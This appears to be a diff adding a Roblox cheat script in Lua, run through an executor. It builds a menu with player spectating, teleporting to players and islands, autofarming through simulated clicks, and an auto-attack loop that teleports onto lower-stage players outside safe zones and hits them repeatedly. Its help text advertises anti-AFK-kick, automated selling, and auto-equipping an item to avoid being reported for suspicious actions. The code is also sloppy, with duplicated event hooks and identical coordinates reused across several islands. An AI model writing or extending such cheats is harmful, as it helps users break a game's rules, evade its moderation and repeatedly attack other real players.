+        CurrentPlayer.TextWrapped = true -- Prevents overflow
+        CurrentPlayer.Parent = Frame
+        
+        local PrevButton = Instance.new("TextButton")
+        PrevButton.Size = UDim2.new(0.25, 0, 0.25, 0)
+        PrevButton.Position = UDim2.new(0.12, 0, 0.375, 0)
+        PrevButton.Text = "<"
+        PrevButton.BackgroundTransparency = 0.7
+        PrevButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+        PrevButton.TextColor3 = Color3.new(1, 1, 1)
+        PrevButton.Font = Enum.Font.GothamBold
+        PrevButton.TextSize = 18
+        PrevButton.Parent = Frame
+        
+        local NextButton = Instance.new("TextButton")
+        NextButton.Size = UDim2.new(0.25, 0, 0.25, 0)
+        NextButton.Position = UDim2.new(0.63, 0, 0.375, 0)
+        NextButton.Text = ">"
+        NextButton.BackgroundTransparency = 0.7
+        NextButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+        NextButton.TextColor3 = Color3.new(1, 1, 1)
+        NextButton.Font = Enum.Font.GothamBold
+        NextButton.TextSize = 18
+        NextButton.Parent = Frame
+        
+        -- Spectate logic
+        local currentIndex = 0
+        local allPlayers = {}
+        
+        local function updatePlayerList()
+            allPlayers = Players:GetPlayers()
+            table.remove(allPlayers, table.find(allPlayers, LocalPlayer) or -1) -- Safely remove LocalPlayer
+        end
+        
+        local function spectatePlayer(index)
+            if index == 0 then
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                    Camera.CameraSubject = LocalPlayer.Character.Humanoid
+                    CurrentPlayer.Text = "YOU"
+                end
+            else
+                local target = allPlayers[index]
+                if target and target.Character and target.Character:FindFirstChild("Humanoid") then
+                    Camera.CameraSubject = target.Character.Humanoid
+                    -- Truncate long names with "...." if needed
+                    CurrentPlayer.Text = if string.len(target.Name) > 15
+                        then string.sub(target.Name, 1, 12) .. "...."
+                        else target.Name
+                end
+            end
+        end
+        
+        local function safeSpectate(index)
+            updatePlayerList()
+            if #allPlayers == 0 then
+                currentIndex = 0
+            else
+                currentIndex = math.clamp(index, 0, #allPlayers)
+            end
+            spectatePlayer(currentIndex)
+        end
+        
+        -- Initialize
+        updatePlayerList()
+        spectatePlayer(0) -- Start spectating self
+        
+        -- Button controls
+        PrevButton.MouseButton1Click:Connect(function()
+            safeSpectate(currentIndex - 1)
+        end)
+        
+        NextButton.MouseButton1Click:Connect(function()
+            safeSpectate(currentIndex + 1)
+        end)
+        
+        -- Toggle integration (assuming PlayerTab is defined elsewhere)
+        local Toggle = PlayerTab:CreateToggle({
+            Name = "Spectate",
+            CurrentValue = false,
+            Flag = "Toggle21",
+            Callback = function(Value)
+                Frame.Visible = Value
+                if Value then
+                    safeSpectate(0) -- Reset to self when enabling
+                else
+                    -- Return camera control to game when disabling
+                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                        Camera.CameraSubject = LocalPlayer.Character.Humanoid
+                    end
+                end
+            end,
+        })
+        
+        -- Player tracking
+        Players.PlayerAdded:Connect(updatePlayerList)
+        Players.PlayerRemoving:Connect(updatePlayerList)
+        
+        -- Dragging improvement: Only drag when holding the frame background
+        Frame.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                Frame.Draggable = true
+            end
+        end)
+        
+        Frame.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                Frame.Draggable = false
+            end
+        end)
+        
+        -- Player tracking
+        Players.PlayerAdded:Connect(updatePlayerList)
+        Players.PlayerRemoving:Connect(updatePlayerList)
+        
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local Dropdown
+        
+        -- Function to teleport to a chosen player
+        local function TeleportToPlayer(targetName)
+            local targetPlayer = Players:FindFirstChild(targetName)
+            
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
+                
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
+                end
+            end
+        end
+        
+        -- Function to update dropdown options
+        local function UpdateDropdown()
+            local playerNames = {}
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then  -- Exclude local player
+                    table.insert(playerNames, player.Name)
+                end
+            end
+        
+            if Dropdown then
+                Dropdown:SetOptions(playerNames)  -- Update existing dropdown options
+            else
+                Dropdown = PlayerTab:CreateDropdown({
+                    Name = "Teleport to Player",
+                    Options = playerNames,
+                    CurrentOption = {},
+                    MultipleOptions = false,
+                    Flag = "Dropdown5",
+                    Callback = function(Options)
+                        if Options[1] then
+                            TeleportToPlayer(Options[1])
+                        end
+                    end,
+                })
+            end
+        end
+        
+        
+        Players.PlayerAdded:Connect(UpdateDropdown)
+        Players.PlayerRemoving:Connect(UpdateDropdown)
+        
+        -- Initial update
+        UpdateDropdown()
+        
+        
+        local VirtualUser = game:GetService("VirtualUser")
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local RunService = game:GetService("RunService")
+        
+        -- Faction Configuration
+        local HEROIC_FAMES = {
+            "Nice Guy", "Bodyguard", "Guardian", "Saint", "Angelic", 
+            "Vanquisher", "Savior", "The Watcher", "Keeper of Light",
+            "Peacemaker", "Invulnerable", "Osiris", "Arch-angel",
+            "Paladin", "Demigod", "Heavenly", "Emperor"
+        }
+        
+        local NOTORIOUS_FAMES = {
+            "Bully", "Jerk", "Thug", "Criminal", "Godfather",
+            "Corrupted", "Hunter", "Tyrant", "Cursebearer", "Sinister",
+            "Satan", "Bloodthirsty", "Arch-demon", "Asmodeus", "The Devil",
+            "Undying", "Warlord", "Chaos King", "Berserker", "Nightmare",
+        }
+        
+        -- Immunity Zones
+        local ImmunityZones = {
+            Vector3.new(-634.5390625, -53.9104830932617, 1859.409912109371), -- original
+            Vector3.new(-646.37, -53.64, 1784.42) -- new one
+        }
+        local ImmunityRadius = 20
+        
+        -- Debug Mode
+        local DEBUG_MODE = true
+        local function debugPrint(message)
+            if DEBUG_MODE then
+                print("[DEBUG]", message)
+            end
+        end
+        
+        -- Core Functions
+        local function isInImmunityZone(player)
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local pos = player.Character.HumanoidRootPart.Position
+                for _, zone in pairs(ImmunityZones) do
+                    if (pos - zone).Magnitude <= ImmunityRadius then
+                        return true
+                    end
+                end
+            end
+            return false
+        end
+        
+        -- Removed the entire equipFist() function here
+        
+        local function getStage(player)
+            local leaderstats = player:FindFirstChild("leaderstats")
+            if leaderstats then
+                local stage = leaderstats:FindFirstChild("Stage")
+                if stage then
+                    return stage.Value
+                end
+            end
+            return 0
+        end
+        
+        local function getFaction(player)
+            if not player.Character then return "Neutral" end
+            local head = player.Character:FindFirstChild("Head")
+            if not head then return "Neutral" end
+            local titleGui = head:FindFirstChild("TitleGui")
+            if not titleGui then return "Neutral" end
+            local fameTxt = titleGui:FindFirstChild("FameTxt")
+            if not fameTxt or not fameTxt:IsA("TextLabel") then return "Neutral" end
+            
+            local text = string.lower(fameTxt.Text)
+            for _, name in ipairs(HEROIC_FAMES) do
+                if string.find(text, string.lower(name)) then
+                    return "Heroic"
+                end
+            end
+            for _, name in ipairs(NOTORIOUS_FAMES) do
+                if string.find(text, string.lower(name)) then
+                    return "Notorious"
+                end
+            end
+            return "Neutral"
+        end
+        
+        local function isValidTarget(myFaction, targetFaction)
+            return (myFaction == "Heroic" and targetFaction == "Notorious") or
+                   (myFaction == "Notorious" and (targetFaction == "Heroic" or targetFaction == "Neutral"))
+        end
+        
+        local function isTargetValid(player)
+            if not player then return false end
+            if not player.Character then return false end
+            if not player.Character:FindFirstChild("Humanoid") then return false end
+            if not player.Character:FindFirstChild("HumanoidRootPart") then return false end
+            return player.Character.Humanoid.Health > 0
+        end
+        
+        local function performAttack()
+            VirtualUser:ClickButton1(Vector2.new(9e9, 9e9))
+        end
+        
+        local function attackAndTeleportLoop()
+            debugPrint("Starting combat loop...")
+            
+            while getgenv().AutoFarm do
+                local myStage = getStage(LocalPlayer)
+                local myFaction = getFaction(LocalPlayer)
+                local currentTarget = nil
+                
+                -- TARGET SELECTION PHASE
+                debugPrint("Searching for targets...")
+                for _, player in pairs(Players:GetPlayers()) do
+                    if player == LocalPlayer then continue end
+                    
+                    if isTargetValid(player) then
+                        local targetStage = getStage(player)
+                        local targetFaction = getFaction(player)
+                        
+                        if targetStage < myStage and not isInImmunityZone(player) and isValidTarget(myFaction, targetFaction) then
+                            currentTarget = player
+                            debugPrint("Found target: "..player.Name.." | Stage: "..targetStage.." | Faction: "..targetFaction)
+                            break
+                        end
+                    end
+                end
+                
+                -- COMBAT PHASE
+                if currentTarget then
+                    debugPrint("Engaging target: "..currentTarget.Name)
+                    local MAX_COMBAT_TIME = 8
+                    local combatStart = os.clock()
+                    
+                    while getgenv().AutoFarm 
+                          and os.clock() - combatStart < MAX_COMBAT_TIME 
+                          and isTargetValid(currentTarget) do
+                        
+                        -- Teleport to target
+                        local targetHRP = currentTarget.Character.HumanoidRootPart
+                        local myHRP = LocalPlayer.Character.HumanoidRootPart
+                        myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 0, 0)
+                        
+                        -- Perform attack
+                        performAttack()
+                        
+                        -- Check if target died
+                        if not isTargetValid(currentTarget) then
+                            debugPrint("Target defeated!")
+                            break
+                        end
+                        
+                        task.wait(0.05)
+                    end
+                    
+                    task.wait(0.5)
+                else
+                    debugPrint("No valid targets found, waiting...")
+                    task.wait(1)
+                end
+            end
+        end
+        
+        -- Toggle Setup
+        local activeLoop = nil
+        
+        local ToggleAutoFarm = PlayerTab:CreateToggle({
+            Name = "Auto Attack & Teleport",
+            CurrentValue = false,
+            Flag = "Toggle20",
+            Callback = function(Value)
+                getgenv().AutoFarm = Value
+                if Value then
+                    if activeLoop then
+                        task.cancel(activeLoop)
+                    end
+                    activeLoop = task.spawn(attackAndTeleportLoop)
+                    debugPrint("Auto farming enabled")
+                else
+                    if activeLoop then
+                        task.cancel(activeLoop)
+                        activeLoop = nil
+                    end
+                    debugPrint("Auto farming disabled")
+                end
+            end,
+        })
+        
+        
+        
+        
+        
+        
+        --TryTab
+        
+        local lobbyCFrame = CFrame.new(-35.8950806, 618.64978, 1857.83167)
+        local lobbyLooping = false
+        local teleportTask
+        
+        -- Define this function if it doesn't exist
+        local function tweenToPosition(cframe, duration)
+            if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                return false
+            end
+            
+            local hrp = LocalPlayer.Character.HumanoidRootPart
+            local tweenInfo = TweenInfo.new(
+                duration,
+                Enum.EasingStyle.Linear,
+                Enum.EasingDirection.Out,
+                0,
+                false,
+                0
+            )
+            
+            local tween = game:GetService("TweenService"):Create(
+                hrp,
+                tweenInfo,
+                {CFrame = cframe}
+            )
+            
+            tween:Play()
+            tween.Completed:Wait()
+            return true
+        end
+        
+        local Dropdown = TryTab:CreateDropdown({
+            Name = "Select Island",
+            Options = {
+                "None", "Lobby", "[1] Hercules", "[2] Ares", "[3] Poseidon", "[4] Hades", "[5] Athena", "[6] Zeus",
+                "[7] Cronus", "[8] Robots", "[9] Bugs", "[10] Cyber", "[11] Divinities", "[12] Egyptians",
+                "[13] Hollowed", "[14] The Trial", "[15] The End"
+            },
+            CurrentOption = {"None"}, -- Changed to table format
+            MultipleOptions = false,
+            Flag = "Dropdown6",
+            Callback = function(Options)
+                local selectedOption = Options[1] or "None" -- Added fallback
+        
+                -- Stop any running teleport loop
+                lobbyLooping = false
+                if teleportTask then
+                    task.cancel(teleportTask)
+                    teleportTask = nil
+                end
+        
+                -- Define teleport positions
+                local locations = {
+                    ["Lobby"] = lobbyCFrame,
+                    ["[1] Hercules"] = CFrame.new(1272.44,94.00,1851.11),
+                    ["[2] Ares"] = CFrame.new(4055.03,94.01,1815.06),
+                    ["[3] Poseidon"] = CFrame.new(6665.31,94.01,1902.04),
+                    ["[4] Hades"] = CFrame.new(9393.84, 94.01,1875.97),
+                    ["[5] Athena"] = CFrame.new(11798.42,94.01,1875.52),
+                    ["[6] Zeus"] = CFrame.new(14596.24,94.01,1904.77),
+                    ["[7] Cronus"] = CFrame.new(17247.50,94.01,1848.54),
+                    ["[8] Robots"] = CFrame.new(19979.43,94.01,1889.56),
+                    ["[9] Bugs"] = CFrame.new(22494.12,94.01,1858.39),
+                    ["[10] Cyber"] = CFrame.new(25107.67,94.01,1889.34),
+                    ["[11] Divinities"] = CFrame.new(27536.45,94.01,1815.89),
+                    ["[12] Egyptians"] = CFrame.new(30026.91,94.01,1872.04),
+                    ["[13] Hollowed"] = CFrame.new(32671.49, 94.01, 1852.79),
+                    ["[14] The Trial"] = CFrame.new(35397.16,94.01,1898.30),
+                    ["[15] The End"] = CFrame.new(37852.44,94.01,1875.86)
+                }
+        
+                if selectedOption == "None" then
+                    return -- Do nothing for "None"
+                elseif selectedOption == "Lobby" then
+                    lobbyLooping = true
+                    teleportTask = task.spawn(function()
+                        while lobbyLooping and task.wait(5) do -- Added safety check
+                            pcall(function() -- Error handling
+                                tweenToPosition(lobbyCFrame, 0.5)
+                            end)
+                        end
+                    end)
+                elseif locations[selectedOption] then
+                    pcall(function() -- Error handling
+                        tweenToPosition(locations[selectedOption], 0.8)
+                    end)
+                end
+            end,
+        })
+        
+        
+        local moving = false
+        local selectedOption = "Choose Option"
+        local humanoidRootPart = nil
+        
+        -- Function to get the current HumanoidRootPart with safety checks
+        local function getHumanoidRootPart()
+            local character = game.Players.LocalPlayer.Character
+            if character then
+                return character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart")
+            end
+            return nil
+        end
+        
+        -- Function to equip Foot from backpack
+        local function equipFoot()
+            local backpack = game:GetService("Players").LocalPlayer:FindFirstChild("Backpack")
+            if not backpack then return end
+            
+            for _, item in ipairs(backpack:GetChildren()) do
+                if item.Name:lower():find("foot") and item:IsA("Tool") then
+                    game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(item)
+                    break
+                end
+            end
+        end
+        
+        -- Function to simulate M1 click
+        local function clickM1()
+            local virtualInput = game:GetService("VirtualInputManager")
+            virtualInput:SendMouseButtonEvent(0, 0, 0, true, game, 1)
+            task.wait(0.1)
+            virtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 1)
+        end
+        
+        -- Function to handle movement and M1 clicking
+        local function startMovement(option, positions)
+            moving = true
+            equipFoot() -- Equip foot when movement starts
+            
+            task.spawn(function()
+                while moving do
+                    humanoidRootPart = getHumanoidRootPart()
+                    if not humanoidRootPart then
+                        -- Wait for character to respawn
+                        game.Players.LocalPlayer.CharacterAdded:Wait()
+                        humanoidRootPart = getHumanoidRootPart()
+                        equipFoot() -- Re-equip foot after respawn
+                    end
+                    
+                    if option == "Devil" then
+                        humanoidRootPart.CFrame = positions.Devil1
+                        clickM1()
+                        task.wait(3)
+                        humanoidRootPart.CFrame = positions.Devil2
+                        clickM1()
+                        task.wait(3)
+                    elseif option == "Angel" then
+                        humanoidRootPart.CFrame = positions.Angel1
+                        clickM1()
+                        task.wait(3)
+                        humanoidRootPart.CFrame = positions.Angel2
+                        clickM1()
+                        task.wait(3)
+                    elseif option == "Middle" then
+                        humanoidRootPart.CFrame = positions.Middle
+                        clickM1()
+                        task.wait(3)
+                    end
+                end
+            end)
+        end
+        
+        -- Initialize HumanoidRootPart reference
+        game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
+            humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+        end)
+        
+        -- Get initial reference
+        if game.Players.LocalPlayer.Character then
+            humanoidRootPart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+        end
+        
+        -- Hercules Dropdown
+        local LieutenantDropdown = TryTab:CreateDropdown({
+            Name = "1st Bloodline [Hercules]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown7",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(1750, -57.5004883, 1882.00024),
+                        Devil2 = CFrame.new(2442, -57.5004883, 1870.00024),
+                        Angel1 = CFrame.new(2122.85, 4.83, 2153.45),
+                        Angel2 = CFrame.new(2135.10, 4.83, 1618.96),
+                        Middle = CFrame.new(2142, 72.96, 1886.86)
+                    })
+                end
+            end,
+        })
+        
+        -- Ares Dropdown
+        local AresDropdown = TryTab:CreateDropdown({
+            Name = "2nd Bloodline[Ares]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown8",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(5116, -57.5004883, 1850.00024),
+                        Devil2 = CFrame.new(5006, -57.5004883, 1670.00024),
+                        Angel1 = CFrame.new(4480.53, -66.96, 1873.10),
+                        Angel2 = CFrame.new(4619.06, 67.86, 2191.77),
+                        Middle = CFrame.new(4790.08, 72.96, 1883.74)
+                    })
+                end
+            end,
+        })
+        
+        -- Poseidon Dropdown
+        local PoseidonDropdown = TryTab:CreateDropdown({
+            Name = "3rd Bloodline[Poseidon]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown9",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(7258.40039, -57.5004883, 1694.07031),
+                        Devil2 = CFrame.new(7580, -57.5004883, 1902.0802),
+                        Angel1 = CFrame.new(7641.90, 113.07, 1713.49),
+                        Angel2 = CFrame.new(7027.47, 113.07, 1899.24),
+                        Middle = CFrame.new(7423.88, 116.17, 1894.63)
+                    })
+                end
+            end,
+        })
+        
+        -- Hades Dropdown
+        local HadesDropdown = TryTab:CreateDropdown({
+            Name = "4th Bloodline[Hades]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown1.",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(10069.1484, -57.5004883, 2283.63013),
+                        Devil2 = CFrame.new(9942.18848, -57.800293, 1490.21021),
+                        Angel1 = CFrame.new(9622.37, 112.30, 1882.91),
+                        Angel2 = CFrame.new(10496.92, 112.60, 1875.61),
+                        Middle = CFrame.new(10077.96, 130.46, 1889.09)
+                    })
+                end
+            end,
+        })
+        
+        -- Athena Dropdown
+        local AthenaDropdown = TryTab:CreateDropdown({
+            Name = "5th Bloodline[Athena]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown11",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(12301.7012, -57.5004883, 1887.00024),
+                        Devil2 = CFrame.new(12879.7617, -57.5004883, 1642.82019),
+                        Angel1 = CFrame.new(13082.91, 155.06, 1796.23),
+                        Angel2 = CFrame.new(12649.79, 155.66, 2171.43),
+                        Middle = CFrame.new(12711.25, 167.06, 1837.08)
+                    })
+                end
+            end,
+        })
+        
+        -- Zeus Dropdown
+        local ZeusDropdown = TryTab:CreateDropdown({
+            Name = "6th Bloodline[Zeus]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown12",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(15551.2803, -54.5004883, 2091.14014),
+                        Devil2 = CFrame.new(15097, -54.5004883, 1925.00024),
+                        Angel1 = CFrame.new(15654.08, 158.06, 1810.93),
+                        Angel2 = CFrame.new(15173.99, 158.06, 2181.33),
+                        Middle = CFrame.new(15343.09, 161.06, 1847.09)
+                    })
+                end
+            end,
+        })
+        
+        -- Cronus Dropdown
+        local CronusDropdown = TryTab:CreateDropdown({
+            Name = "7th Bloodline[Cronus]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown13",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(18350.7109, -57.6010742, 1898.51025),
+                        Devil2 = CFrame.new(17671.1699, -57.6547852, 1983.44019),
+                        Angel1 = CFrame.new(17862.35, 255.39, 1476.00),
+                        Angel2 = CFrame.new(17862.35, 255.39, 1476.00),
+                        Middle = CFrame.new(17967.72, 231.39, 1872.65)
+                    })
+                end
+            end,
+        })
+        
+        -- Robots Dropdown
+        local BotsDropdown = TryTab:CreateDropdown({
+            Name = "8th Bloodline[Robots]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown14",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(20583.1621, -57.6010742, 1682.76025),
+                        Devil2 = CFrame.new(20628, -57.6547852, 2078.58008),
+                        Angel1 = CFrame.new(20436.26, 301.16, 1946.15),
+                        Angel2 = CFrame.new(20904.26, 308.96, 1933.62),
+                        Middle = CFrame.new(20655.21, 227.00, 1896.29)
+                    })
+                end
+            end,
+        })
+        
+        -- Bugs Dropdown
+        local BugsDropdown = TryTab:CreateDropdown({
+            Name = "9th Bloodline[Bugs]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown15",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(23318.71, 692.53, 2022.52),
+                        Devil2 = CFrame.new(23318.71, 692.53, 2022.52),
+                        Angel1 = CFrame.new(23318.71, 692.53, 2022.52),
+                        Angel2 = CFrame.new(23318.71, 692.53, 2022.52),
+                        Middle = CFrame.new(23318.71, 692.53, 2022.52)
+                    })
+                end
+            end,
+        })
+        
+        -- Cyber Dropdown
+        local CyberDropdown = TryTab:CreateDropdown({
+            Name = "10th Bloodline[Cyber]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown16",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(25971.24, 708.20, 1999.64),
+                        Devil2 = CFrame.new(25971.24, 708.20, 1999.64),
+                        Angel1 = CFrame.new(25971.24, 708.20, 1999.64),
+                        Angel2 = CFrame.new(25971.24, 708.20, 1999.64),
+                        Middle = CFrame.new(25971.24, 708.20, 1999.64)
+                    })
+                end
+            end,
+        })
+        
+        local CyberDropdown = TryTab:CreateDropdown({
+            Name = "11th Bloodline[Divinities]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown17",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(28713.60,1434.99,2041.96
+                    ),
+                        Devil2 = CFrame.new(28713.60,1434.99,2041.96
+                    ),
+                        Angel1 = CFrame.new(28713.60,1434.99,2041.96
+                    ),
+                        Angel2 = CFrame.new(28713.60,1434.99,2041.96
+                    ),
+                        Middle = CFrame.new(28713.60,1434.99,2041.96
+                    )
+                    })
+                end
+            end,
+        })
+        
+        local CyberDropdown = TryTab:CreateDropdown({
+            Name = "12th Bloodline[Egyptians]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown18",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Devil2 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Angel1 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Angel2 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Middle = CFrame.new(36425.56,985.87,2029.98
+                    )
+                    })
+                end
+            end,
+        })
+        
+        local HollowedDropdown = TryTab:CreateDropdown({
+            Name = "13th Bloodline[Hollowed]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown19",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Devil2 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Angel1 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Angel2 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Middle = CFrame.new(36425.56,985.87,2029.98
+                    )
+                    })
+                end
+            end,
+        })
+        
+        local TTrialDropdown = TryTab:CreateDropdown({
+            Name = "14th Bloodline[Trial]",
+            Options = {"Choose Option", "Angel", "Devil", "Middle"},
+            CurrentOption = {"Choose Option"},
+            MultipleOptions = false,
+            Flag = "Dropdown20",
+            Callback = function(Options)
+                selectedOption = Options[1]
+                moving = false
+                if selectedOption ~= "Choose Option" then
+                    startMovement(selectedOption, {
+                        Devil1 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Devil2 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Angel1 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Angel2 = CFrame.new(36425.56,985.87,2029.98
+                    ),
+                        Middle = CFrame.new(36425.56,985.87,2029.98
+                    )
+                    })
+                end
+            end,
+        })
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        -- Paragraph:
+        local Paragraph = MiscTab:CreateParagraph({Title = "Asaiya Sell if Full", Content = "Gains muscle, and Automatically sells if FULL DNA"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Auto Click (No Gamepass)", Content = "Normal Speed Auto Clicker"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Gamepass TIPS", Content = "If you use my script 24/7, you only need to get 2x COINS and 2x MUSCLE gamepasses."})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Auto Click (Fast Clicker Gamepass)", Content = "Lifting speed is the same as having Fast Lifter Gamepass"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Auto Sell", Content = "Every 3 seconds, muscle will sell even without going to sell circle."})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Smart Weight", Content = "Will ONLY buy the Weight enough to get to next stage in order to save coins"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Buy Smart DNA", Content = "Will ONLY buy the DNA enough to get to next stage in order to save coins"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Auto Body Alter", Content = "Auto buy new Body Alter (Stage)"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Bloodline Autofarm", Content = "Teleports you to the small enemies and auto stomps them so you can get bloodline points."})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Anti AFK KICK", Content = "You will not be kicked after 20 minutes of inactivity"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Auto Equip Weight", Content = "It will automatically Equip Your Weight so you don't get reported for surpicious actions"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Auto Clicker", Content = "Auto Clicks your screen every 17 seconds"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Auto Clicker FAST", Content = "Auto Clicks your screen every milissecond"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "White Screen", Content = "Turns your screen to white to save FPS"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Black Screen", Content = "Covers your ENTIRE screen With Pitch Black to save FPS"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Teleport to Player", Content = "Literally teleports you to the player"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Kill Player", Content = "Teleports to players whose stages are lower than yours"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Credit of the script goes to", Content = "Asaiya(Plan), Kiretsuki(Tester), Uron(Coder), and Raizel(Funds)"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Destroy Everything", Content = "Destroys all Mesh and non required things to save FPS"})
+        local Paragraph = MiscTab:CreateParagraph({Title = "True INVISIBILITY", Content = "Completely Makes your character Disappear to save FPS, Only invisible to you."})
+        local Paragraph = MiscTab:CreateParagraph({Title = "Freeze Position", Content = "Literally freezes your avatar, so if you're falling, you will stay in that position."})
